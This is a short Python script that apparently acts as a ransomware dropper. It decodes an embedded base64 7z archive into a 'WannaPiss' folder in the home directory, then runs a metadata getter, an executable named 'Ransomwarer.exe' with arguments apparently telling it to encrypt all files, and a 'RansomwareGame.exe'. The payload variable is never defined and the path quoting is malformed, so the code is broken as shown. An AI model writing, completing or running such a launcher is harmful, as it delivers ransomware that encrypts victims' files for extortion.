
import os
import py7zr
import base64
from io import BytesIO
compressed_data_bytes = base64.b64decode(compressed_data_string)
bio = BytesIO(compressed_data_bytes)
home = os.path.expanduser("~") + "/"
wp_dir = home + "WannaPiss/"
py7zr.unpack_7zarchive(bio, wp_dir)
os.system('"' + wp_dir + '"' + "Metadata_Getter.exe")
os.system('"' + wp_dir + '"' + "Ransomwarer.exe e '*'")
os.system('"' + wp_dir + '"' + "RansomwareGame.exe")
